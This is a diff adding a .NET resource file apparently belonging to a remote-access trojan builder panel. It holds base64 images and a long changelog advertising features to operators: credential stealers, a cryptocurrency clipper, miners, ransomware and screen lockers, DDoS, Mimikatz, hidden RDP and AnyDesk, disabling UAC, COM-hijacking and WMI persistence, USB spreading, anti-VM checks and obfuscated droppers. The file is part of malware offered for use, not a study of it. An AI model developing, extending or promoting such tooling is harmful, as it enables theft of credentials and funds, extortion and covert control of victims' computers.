@@ -1,0 +1,332 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<root>
+  <xsd:schema id="root" xmlns="" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:msdata="urn:schemas-microsoft-com:xml-msdata">
+    <xsd:element name="root" msdata:IsDataSet="true">
+      <xsd:complexType>
+        <xsd:choice maxOccurs="unbounded">
+          <xsd:element name="data">
+            <xsd:complexType>
+              <xsd:sequence>
+                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
+                <xsd:element name="comment" type="xsd:string" minOccurs="0" msdata:Ordinal="2" />
+              </xsd:sequence>
+              <xsd:attribute name="name" type="xsd:string" msdata:Ordinal="1" />
+              <xsd:attribute name="type" type="xsd:string" msdata:Ordinal="3" />
+              <xsd:attribute name="mimetype" type="xsd:string" msdata:Ordinal="4" />
+            </xsd:complexType>
+          </xsd:element>
+          <xsd:element name="resheader">
+            <xsd:complexType>
+              <xsd:sequence>
+                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
+              </xsd:sequence>
+              <xsd:attribute name="name" type="xsd:string" use="required" />
+            </xsd:complexType>
+          </xsd:element>
+        </xsd:choice>
+      </xsd:complexType>
+    </xsd:element>
+  </xsd:schema>
+<resheader name="resmimetype"><value>text/microsoft-resx</value></resheader><resheader name="version"><value>1.3</value></resheader><resheader name="reader"><value>System.Resources.ResXResourceReader, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value></resheader><resheader name="writer"><value>System.Resources.ResXResourceWriter, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value></resheader><data name="buttonEnglish.Image" mimetype="application/x-microsoft.net.object.binary.base64"><value>AAEAAAD/////AQAAAAAAAAAMAgAAAFFTeXN0ZW0uRHJhd2luZywgVmVyc2lvbj00LjAuMC4wLCBD
+dWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWIwM2Y1ZjdmMTFkNTBhM2EFAQAAABVTeXN0
+ZW0uRHJhd2luZy5CaXRtYXABAAAABERhdGEHAgIAAAAJAwAAAA8DAAAAfQEAAAKJUE5HDQoaCgAA
+AA1JSERSAAAAMAAAADAIBgAAAFcC+YcAAAAEZ0FNQQAAsY8L/GEFAAAACXBIWXMAAAsRAAALEQF/
+ZF+RAAABH0lEQVRoQ+2VoYpCQRSG9aWsBmHBpkmQLZv1CQw+gMm6Vl9BYUUFg2zbJijYDCZhFU2W
+I3NB0X/GcOToXOT/4YN70pmP+w+TyTAMwzAMEzkiks2X+2LNoZB7Gu8pUKwOpN2ZXQ6gneuN34Qo
+Ah+VH5kvt+LSbP2Jdv6sTWS3Pya4byew+d89DU/ALfzuLmQ8XUvpa5QcQDv3hquE8x/ApZYEBazB
+pZbcFcBea+fre4C9tSQogL3WzngPcKklQQEH9lo7X98DXGrJXQFLsLeWBAWwz9oZ3wFcaokngH3W
+ztj/lwu4hdhn7YzvAPbWkqCANbjUkvcTwI6lHQrExhPAjqUdCsTGE8COpR0KxMYTwI6lHQrE5kaA
+YRiGYRjmsZwAlprn8GsfEIIAAAAASUVORK5CYIIL</value></data><data name="buttonRussian.Image" mimetype="application/x-microsoft.net.object.binary.base64"><value>AAEAAAD/////AQAAAAAAAAAMAgAAAFFTeXN0ZW0uRHJhd2luZywgVmVyc2lvbj00LjAuMC4wLCBD
+dWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWIwM2Y1ZjdmMTFkNTBhM2EFAQAAABVTeXN0
+ZW0uRHJhd2luZy5CaXRtYXABAAAABERhdGEHAgIAAAAJAwAAAA8DAAAAzAAAAAKJUE5HDQoaCgAA
+AA1JSERSAAAAMAAAADAIBgAAAFcC+YcAAAAEZ0FNQQAAsY8L/GEFAAAACXBIWXMAAAsRAAALEQF/
+ZF+RAAAAbklEQVRoQ+2PwQ2AQBCErjFjDRZrP3qNrH8KmGQMJPxhLRERkT/wvHuaZL8DadnvQFr2
+O5CW/Q6kZX//wHnd0yT7HUjLfgfSst+BtOx3IC37+wfmWNMk+x1Iy34H0rLfgbTsdyAt+/sHRERE
+GvkAu7/5fGHUKlQAAAAASUVORK5CYIIL</value></data><data name="richTextBoxChangeLog.Text" xml:space="preserve"><value>[+} ChangeLog v3.0 [09.05.2026]
+- Added a new "Builds" tab to "FormBuilder" - the essence of this function is that it the history of your builds.
+- Added new Winlogon Shell feature that integrates your build into Winlogon.
+- Added a new COM Hijacking feature. The essence of this feature is COM Hijacking - a technique used by attackers to execute malicious code, bypass protection and gain a foothold in the Windows system.
+- Added a new Windows Service function. The essence of this function is that it installs your build into Windows services.
+- Added a new function WMI Startup. The essence of the function is that it installs your build in WMI startup.
+- Added "Build + Join + VMP", "Build + Dropper + Join + VMP", "Build + Dropper + VMP", "Build + Dropper + Pump + VMP" - Now you can create under VMP obfuscation.
+- Added a new function Process Name in the "FormBuilder" in the Common tab. The essence of this function is that it changes the name of your client's process in the task manager.
+- Rework "Install Archive" to "FormBuilder" - improved.
+- Fixed "Build + Join", "Build + Dropper + Join", "Build + Dropper", "Build + Dropper + Pump" - Function fix Now they work normally as they should.
+
+[+} ChangeLog v2.9 [03.05.2026]
+- Added "Enable Feature" - The essence of this plugin is that it enables and disables Windows components.
+- Added "Malware Installer" - New tab in the "Action" tab. The point of this tab is that all installers will now be stored there.
+- Added "Scheduler" - Added the ability to disable and enable the scheduler in action.
+- Added "System License" - Authorization was made + bot.
+- Updated "Icon" - updated icons.
+- Updated "Intelix Stealer" - decryptions updated
+- Updated "Salsa Stealer" - decryptions updated
+- Updated "Antarctida Stealer" - decryptions updated
+- Updated "Tasks" - Now you can install more in tasks than before.
+- Updated "Notificator" - The design has been changed and a message is now displayed when a user is disconnected.
+- Rework "Screamer" - New form and also new types of screamers have been added.
+- Rework "Sniffer" - The sniffer has been transferred and now it sniffs https and requests.
+- Rework "Custom Background" - It has been redesigned so you can now set transparency instead of blur.
+- Rework "FormAbout" - Now the gif is replaced by a regular photo, and the server.exe size has been reduced.
+- Rework "Auto Stealer" - Now the auto stealer checks whether the user has a log or not and then sends the Intelix + Salsa stealer. If one doesn't collect it, it collects the other one.
+- Fixed "NetExecutor" - Now it works properly and without bugs.
+- Fixed "Config/Client" - works better now.
+- Fixed "Style" - now instead of black texts, white ones were made as they should be.
+
+[+} ChangeLog v2.8 [19.04.2026]
+- Rework "Form1" - Its statistics about users, etc., were reworked, or rather, all the garbage was removed.
+- Rework "notifications" - now have a different, beautiful, modern style.
+- Fixed bugs "Form1" - The bug that prevented you from stretching the form and changing its size has been fixed. Now you can.
+- Fixed bugs "Form Camera" - Now you can change the camera quality.
+- Added "Auto Note" - Now auto note automatically sets countries by user.
+- Added "Copy to Logs" - A button was added to the Logs tab to copy logs.
+- Added "Background" - a feature that allows you to set a custom background.
+- Added "Miner Rigel" - This function was available but not connected, but now it is connected and works.
+- Added "Total Users" - A counter for all your users, both offline and online.
+- Updated "Clipper Panel" - Updated: now you can clip Steam Trade and also Solana BNB and TON.
+- Updated "Miner XMR" - a hashreait panel was created.
+- Updated "Miner ETC" - remixed into Miner BZ.
+- Updated "all handlers" - validation was installed on each handler.
+
+[+} ChangeLog v2.7 [15.04.2026]
+- Removed "Columns" to "Form1" tab "main".
+- Fixed "Dark theme" - The dark theme was fixed in some forms.
+- The form text function in settings has been reworked.
+- Fixed "DDos" plugin - should work correctly
+- Rework "Raindow Theme" - Now only the panel with users is shimmering.
+- Fixed "Style" - Bugs with styles were fixed, in that there were duplicates and also colors did not match the themes, but everything was fixed.
+
+[+} ChangeLog v2.6 [08.04.2026]
+- Added "USB Spread" to "FormBuilder" - unpack your client onto a connected USB flash drive.
+- Added "Process Critical" - The function is installed on the Client so that it closes those processes that will interfere with its operation.
+- Added "WMI Startup" to "FormBuilder" - no work
+- Added "Process Name" to "FormBuilder" - changes the name of your "Client" process. (no work)
+- Added "Boot Kit" to "FormBuilder" - The function allows it to be sewn tightly into the system. (no work)
+- Added "Anti Virtual" to "FormBuilder" - The essence of the function is that it would be possible to enable or disable virtual machine locking.
+- Added "Generate" to "FormBuilder" - The essence of this button is in the 3rd tab; it is needed to generate the "Assembly" for your client.
+- Added "Standart obfuscation" - Functions have been added to enable or disable standard obfuscation from your Client.
+- Added "Build VMP" to "FormBuilder" - Obfuscate your build file with vmp obfuscation.
+- Added "Build Reactor" to "FormBuilder" - Obfuscate your build file under net reactor obfuscation.
+- Added "Build Mpress" to "FormBuilder" - Compresses your build file to the maximum state possible.
+- Added "Build Donut" to "FormBuilder" - build + conut.
+- Added "Build SFX" to "FormBuilder" - The point is that it creates an SFX build that will automatically unpack and run your file.
+
+[+} ChangeLog v2.5 [28.03.2026]
+- Added "Import'IPs" to "FormBuilder" - allows you to import your IP address
+- Added "Import'IPp" to "FormBuilder" - allows you to import your IP address:port
+- Added "Reset" to "FormBuilder" - resets everything to its normal state
+- Update "Stealer" new stealer "Antarctida"
+- Update Recovery Stealer plugin
+- Update "BotKiller - The malware removal system has been improved." plugin
+- Update "DiscordRPC - An animated discordrpc has been created." plugin
+- Added "Ransomware - This plugin allows you to block a user's computer" plugin
+- Added "Windows Recovery - Allows you to enable and disable Windows Recovery" plugin
+- Added "Mimi Katz" plugin
+- Added "Net Executor - Allows you to inject scripts remotely into a user." plugin
+- Added "Nmap" plugin
+- Added "Sniffer - Sniffer allows you to sniff networks" plugin
+- Added "Browser - Allows you to run browsers stealthily" plugin
+- Added "Hardware - A plugin that allows you to manage user disks." plugin
+- Added "Firewall - Allows you to view the user's Firewall" plugin
+- Added "Scanner - The scanner scans the user's networks" plugin
+- Added "Arp Scanner - Arp Scanner is a plugin that allows you to view open ports on a user's IP address." plugin
+- Added "Task Scheduler - Allows you to view the user's task scheduler" plugin
+- Added "Windows Restores - Allows the user to initiate a system reset" plugin
+- Added "Windows Customizer - Allows the user to customize the system" plugin
+- Added "Config" to Client
+- New tab "Columns" 
+
+[+} ChangeLog v2.4 [24.02.2026]
+- Fixed Stub - Fixed client spam in the scheduler
+- Added Recovery Stealer
+- Added "Camera Demonstration - The plugin allows you to open a preview of your camera to the user." plugin
+- Added "Reverse Tunnel - Allows port forwarding" plugin
+- Added "Reverse Forward - Allows port forwarding" plugin
+- Update "WinLocker - The colors have been updated and the blocker has also been improved."
+- Remove Playit Grabber - Allows you to steal plaiyt settings
+- Action plugin "Fixed" - Fixed all functions
+
+[+} ChangeLog v2.3 [20.02.2026]
+- Update "Obfuscator Stub"
+- Added "Hidden RDP - Establishes RDP for the user"
+- Added "Offline users"
+- Added "Disable UAC - Allows the user to disable UAC"
+- Added "Mem Reduct - Loads the user's RAM"
+- Added "Hidden AnyDesk - Installs AnyDesk stealthily"
+- Added tab "Phishing", "Steam Guard"
+- Added "Hidden Installers - Installers of hidden packages on the user's PC" 
+- Added Screamer plugin - displays a scary image to the user
+- Added Fun Audio - Plays funny sounds to the user remotely
+- Added Desktop Demonstration - Allows you to share your screen with the user.
+- Fixed "Stub" Fixed spam Client process for task manager</value></data>
+  <data name="pictureBoxGif.Image" mimetype="application/x-microsoft.net.object.binary.base64"><value>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
